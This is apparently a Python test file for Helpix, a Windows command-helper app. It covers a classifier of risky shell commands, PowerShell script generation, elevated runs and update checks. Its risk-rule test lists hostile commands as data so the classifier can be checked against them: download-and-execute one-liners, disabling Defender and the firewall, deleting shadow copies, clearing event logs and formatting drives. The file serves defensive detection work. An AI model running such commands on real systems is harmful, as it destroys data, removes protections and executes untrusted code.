# SPDX-FileCopyrightText: 2026 Crash
# SPDX-License-Identifier: GPL-3.0-or-later
"""Windows: regole di rischio e script PowerShell (ovunque); esecuzione vera dei comandi (solo su Windows)."""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
_tmp = tempfile.mkdtemp()
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
if sys.platform != "win32":
    os.environ["XDG_CONFIG_HOME"] = os.path.join(_tmp, "config")
    os.environ["XDG_DATA_HOME"] = os.path.join(_tmp, "data")

from helpix import winshell  # noqa: E402

WINDOWS = sys.platform == "win32"


def dangers(cmd: str) -> list[str]:
    return [reason for rx, reason in winshell.DANGEROUS if rx.search(cmd)]


def test_risk_rules():
    risky = {
        "Remove-Item C:\\Temp\\x -Recurse -Force": "ricorsiva",
        "rm -r .\\cartella": "ricorsiva",
        "rd /s /q C:\\dati": "ricorsiva",
        "Format-Volume -DriveLetter E": "formattazione",
        "format e: /q": "formattazione",
        "diskpart /s script.txt": "partizioni",
        "bcdedit /set {default} safeboot minimal": "avvio",
        "reg delete HKLM\\Software\\X /f": "registro",
        "Remove-Item -Path HKLM:\\SOFTWARE\\X": "registro",
        "Restart-Computer -Force": "riavvio",
        "shutdown /r /t 0": "riavvio",
        "iwr https://x.example/a.ps1 | iex": "scaricato",
        "irm https://get.example | Invoke-Expression": "scaricato",
        "iex (New-Object Net.WebClient).DownloadString('https://x')": "scaricato",
        "winget uninstall Mozilla.Firefox": "pacchetti",
        "Get-AppxPackage *xbox* | Remove-AppxPackage": "pacchetti",
        "Stop-Service WinDefend": "servizio",
        "net user mario /delete": "utenti",
        "takeown /f C:\\x /r": "permessi",
        "Set-MpPreference -DisableRealtimeMonitoring $true": "protezioni",
        "netsh advfirewall set allprofiles state off": "protezioni",
        "vssadmin delete shadows /all": "backup",
        "wevtutil cl System": "registri eventi",
        "Set-ExecutionPolicy Unrestricted -Scope LocalMachine": "script",
    }
    for cmd, word in risky.items():
        found = dangers(cmd)
        assert any(word in d for d in found), (cmd, found)
    safe = ["Get-Service | Where-Object Status -eq 'Stopped'", "ipconfig /all", "Get-ChildItem C:\\ -Force",
            "Get-WinEvent -LogName System -MaxEvents 20", "winget upgrade --all", "Remove-Item .\\file.txt",
            "Get-Content C:\\x.log -Tail 20", "sfc /scannow", "reg query HKLM\\Software", "dir /s *.log",
            "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser", "Stop-Service Spooler"]
    for cmd in safe:
        assert not dangers(cmd), (cmd, dangers(cmd))


def test_interactive_and_prompts():
    assert winshell.interactive_call("$n = Read-Host 'Nome'")
    assert winshell.interactive_call("pause")
    assert winshell.interactive_reason("ssh", ["ssh", "host"])
    assert winshell.interactive_reason("python", ["python"])
    assert not winshell.interactive_reason("python", ["python", "script.py"])
    assert winshell.FOLLOW.search("Get-Content app.log -Wait")
    assert winshell.FOLLOW.search("ping 8.8.8.8 -t")
    assert winshell.PROMPT.sub("", "PS C:\\Users\\mario> Get-Process", count=1) == "Get-Process"
    assert winshell.PROMPT.sub("", "C:\\Windows\\System32>ipconfig", count=1) == "ipconfig"
    for word in ("Get-Service", "Restart-NetAdapter", "$x", "cd", ".\\script.ps1", "C:\\tools\\x.exe"):
        assert winshell.is_command_word(word), word
    for word in ("Ciao", "Questo", "Prova-qualcosa-di-strano", "Buon-Natale", "Anti-Virus"):
        assert not winshell.is_command_word(word), word


def test_scripts():
    s = winshell.script("Get-Date", "C:\\Users\\Mario Rossi", "C:\\t\\cwd.txt")
    assert "Set-Location -LiteralPath 'C:\\Users\\Mario Rossi'" in s and "Get-Date" in s and "cwd.txt" in s
    s = winshell.script("x", "C:\\l'archivio", "f")
    assert "'C:\\l''archivio'" in s  # apice raddoppiato: la stringa PowerShell resta chiusa
    e = winshell.elevated_script("Get-Date", "C:\\", "C:\\o.txt", "C:\\rc.txt")
    assert "Out-File -LiteralPath 'C:\\o.txt'" in e and "Set-Content -LiteralPath 'C:\\rc.txt'" in e
    b64 = winshell.encode("Write-Output 'àè'")
    import base64
    assert base64.b64decode(b64).decode("utf-16-le") == "Write-Output 'àè'"
    launcher = winshell.launcher_script("QUJD")
    assert "-Verb RunAs" in launcher and "'QUJD'" in launcher and "exit 1223" in launcher


def _run(cmd: str, cwd: str, root: bool = False):
    from PySide6.QtCore import QCoreApplication, QEventLoop
    from helpix.executor import CommandRunner
    app = QCoreApplication.instance() or QCoreApplication([])
    out: list = []
    runner = CommandRunner(cmd, cwd, root, 60)
    loop = QEventLoop()
    runner.completed.connect(lambda res: (out.append(res), loop.quit()))
    runner.start()
    loop.exec()
    runner.wait(5000)
    del app
    return out[0]


def test_run_commands_on_windows():
    if not WINDOWS:
        print("  (solo su Windows: saltato)")
        return
    from helpix.executor import analyze, looks_like_command
    home = os.path.expanduser("~")
    r = _run("Write-Output 'ciao àèìòù'; $PSVersionTable.PSVersion.Major", home)
    assert r.rc == 0 and "ciao àèìòù" in r.output, (r.rc, r.output)
    r = _run("cd $env:SystemRoot; Get-Location", home)
    assert r.rc == 0 and os.path.normcase(r.cwd) == os.path.normcase(os.environ["SystemRoot"]), (r.cwd, r.output)
    r = _run("exit 3", home)
    assert r.rc == 3, r.rc
    r = _run("Get-Item C:\\non-esiste-davvero", home)
    assert r.rc != 0 and r.output.strip(), (r.rc, r.output)
    r = _run("cmd /c echo da-cmd", home)
    assert r.rc == 0 and "da-cmd" in r.output, r.output
    assert looks_like_command("PS C:\\> Get-Service") == "Get-Service"
    assert looks_like_command("ipconfig /all") == "ipconfig /all"
    assert looks_like_command("Questo è un testo normale") is None
    info = analyze("sudo Restart-Service Spooler")
    assert info.needs_root and not info.dangers
    # sulle macchine di GitHub l'utente è amministratore senza richiesta UAC: il percorso elevato si prova davvero
    r = _run("sudo Write-Output 'elevato'; [Security.Principal.WindowsPrincipal]::new("
             "[Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')", home, root=True)
    print("  elevato:", r.rc, r.output.strip().replace("\n", " | "))
    if os.environ.get("GITHUB_ACTIONS") == "true":
        assert r.rc == 0 and "elevato" in r.output and "True" in r.output, (r.rc, r.output)


def test_conpty_terminal_on_windows():
    if not WINDOWS:
        print("  (solo su Windows: saltato)")
        return
    from PySide6.QtCore import QCoreApplication, QEventLoop, QTimer
    from helpix.pty_process import PtyProcess
    app = QCoreApplication.instance() or QCoreApplication([])
    pty = PtyProcess()
    out, codes = [], []
    loop = QEventLoop()
    pty.output.connect(out.append)
    pty.finished.connect(lambda rc: (codes.append(rc), loop.quit()))
    QTimer.singleShot(30000, loop.quit)
    pty.start(["cmd", "/c", "echo helpix-conpty & exit 4"], os.path.expanduser("~"))
    pty.resize(120, 40)
    loop.exec()
    text = "".join(out)
    assert "helpix-conpty" in text, text
    assert codes == [4], codes
    # programma installato da npm: un file .cmd nel PATH (come gemini.cmd)
    shim_dir = tempfile.mkdtemp()
    with open(os.path.join(shim_dir, "finto-agente.cmd"), "w", encoding="ascii") as f:
        f.write("@echo off\r\necho shim-ok %1\r\nexit /b 0\r\n")
    out.clear()
    codes.clear()
    loop2 = QEventLoop()
    pty.finished.disconnect()
    pty.finished.connect(lambda rc: (codes.append(rc), loop2.quit()))
    QTimer.singleShot(30000, loop2.quit)
    pty.start(["finto-agente", "argomento"], shim_dir, {"PATH": shim_dir + os.pathsep + os.environ["PATH"]})
    loop2.exec()
    assert "shim-ok argomento" in "".join(out), "".join(out)
    assert codes == [0], codes
    del app


def test_diagnostics_on_windows():
    if not WINDOWS:
        print("  (solo su Windows: saltato)")
        return
    from helpix import diagnostics
    sections = diagnostics._windows_sections()
    titles = [t for t, _c, _o in sections]
    assert len(sections) == len(diagnostics.WINDOWS_CHECKS), titles
    body = dict((t, o) for t, _c, o in sections)
    first = diagnostics.WINDOWS_CHECKS[0][0]
    assert "Windows" in body[first] and "RAM:" in body[first], body[first]
    assert "GB free of" in body[diagnostics.WINDOWS_CHECKS[1][0]]
    text = diagnostics.collect()
    assert "PowerShell" in text and len(text) > 300, text[:500]
    print("  diagnosi:", len(text), "caratteri")


def test_windows_hello_on_windows():
    if not WINDOWS:
        print("  (solo su Windows: saltato)")
        return
    from helpix import security
    status = security.hello_status()  # sulle macchine di GitHub nessun PIN: «not-configured» o «unavailable»
    assert status in ("available", "not-configured", "unavailable"), status
    import winrt.windows.security.credentials.ui  # noqa: F401 - le dipendenze di Windows sono installate
    print("  Windows Hello:", status)


def test_update_check():
    from unittest import mock
    from helpix import updates
    assert updates.is_newer("0.16.0", "0.15.2") and updates.is_newer("1.0", "0.99.9")
    assert not updates.is_newer("0.15.2", "0.15.2") and not updates.is_newer("0.15.1", "0.15.2")

    class S(dict):
        def get(self, k, d=None):
            return super().get(k, d)
    assert updates.due(S(check_updates=True)) and not updates.due(S(check_updates=False))
    import time
    assert not updates.due(S(check_updates=True, updates_checked_at=time.time() - 60))

    class R:
        status_code = 200

        @staticmethod
        def json():
            return {"tag_name": "v9.1.0", "html_url": "https://github.com/x/y/releases/tag/v9.1.0", "assets": [
                {"name": "helpix_9.1.0_amd64.deb", "browser_download_url": "https://x/deb"},
                {"name": "Helpix-9.1.0-Setup.exe", "browser_download_url": "https://x/setup"}]}
    with mock.patch("requests.get", return_value=R()) as get:
        info = updates.latest_release()
    assert info == {"version": "9.1.0", "url": "https://github.com/x/y/releases/tag/v9.1.0",
                    "setup": "https://x/setup"}, info
    assert "/repos/Crash-FD01/Helpix/releases/latest" in get.call_args[0][0]


def test_window_list_on_windows():
    if not WINDOWS:
        print("  (solo su Windows: saltato)")
        return
    from helpix.screenshot import windows_window_rects
    rects = windows_window_rects()  # sulle macchine di GitHub può essere vuota: basta che non si rompa
    assert all(w > 40 and h > 30 and isinstance(t, str) for (_x, _y, w, h), t in rects), rects[:3]
    print("  finestre visibili:", len(rects))


if __name__ == "__main__":
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            fn()
            print("ok", name, flush=True)
